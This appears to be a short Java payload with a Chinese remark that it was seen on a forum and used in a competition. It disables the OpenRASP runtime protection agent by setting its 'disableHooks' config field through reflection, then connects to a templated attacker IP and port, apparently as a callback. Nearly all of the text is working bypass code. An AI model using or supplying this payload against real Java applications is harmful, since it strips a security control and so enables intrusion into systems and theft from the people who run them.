```java
try{
    String ip = "${ip}";
    int port = ${port};
    String url = String.format("http://%s:%d", ip, port);
    try {
            Class<?> clz = Thread.currentThread().getContextClassLoader().loadClass("com.baidu.openrasp.config.Config");
            java.lang.reflect.Method getConfig = clz.getDeclaredMethod("getConfig");
            java.lang.reflect.Field disableHooks = clz.getDeclaredField("disableHooks");
            disableHooks.setAccessible(true);
            Object ins = getConfig.invoke(null);

            disableHooks.set(ins,true);
            new java.net.URL(url).openConnection().connect();
    } catch (Exception e) {}
}catch(Exception t){}
```

把那个开关关掉就可以了，之前也在某星球看到过，某次比赛遇到了
